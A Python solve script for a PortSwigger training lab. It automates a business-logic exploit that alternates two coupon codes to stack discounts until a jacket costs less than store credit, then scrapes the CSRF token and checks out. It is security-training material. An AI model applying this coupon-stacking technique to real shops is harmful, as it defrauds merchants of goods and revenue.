#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Flawed enforcement of business rules.

Alternates NEWCUST5 and SIGNUP30 discount codes to stack discounts
until the jacket price drops below the $100 store credit.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JACKET_ID = 1
CODES = ["NEWCUST5", "SIGNUP30"]


def get_cart_total(s, lab):
    r = s.get(f"{lab}/cart")
    m = re.search(r'Total:\s*\$([0-9.]+)', r.text)
    return float(m.group(1)) if m else None


def apply_code(s, lab, code):
    r = s.post(f"{lab}/cart/coupon", data={"coupon": code})
    return r.status_code


def solve(lab, session_cookie, budget=100.0):
    s = requests.Session()
    s.cookies.set("session", session_cookie)
    s.verify = False

    # Add jacket to cart
    s.post(f"{lab}/cart", data={"productId": JACKET_ID, "redir": "PRODUCT", "quantity": 1})
    print("[*] Jacket added to cart.")

    total = get_cart_total(s, lab)
    print(f"[*] Starting price: ${total}")

    i = 0
    while total is None or total > budget:
        code = CODES[i % 2]
        apply_code(s, lab, code)
        total = get_cart_total(s, lab)
        print(f"  [{i+1}] Applied {code} → Total: ${total}")
        i += 1
        if i > 100:
            print("[-] Too many iterations, stopping.")
            break

    print(f"\n[+] Price is now ${total} — proceeding to checkout.")

    # Get CSRF token and checkout
    r = s.get(f"{lab}/cart")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        print("[-] CSRF token not found.")
        return
    s.post(f"{lab}/cart/checkout", data={"csrf": csrf.group(1)})
    print("[+] Order placed — lab solved!")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Flawed Enforcement of Business Rules lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    args = parser.parse_args()

    solve(args.lab_url.rstrip("/"), args.session)


if __name__ == "__main__":
    main()
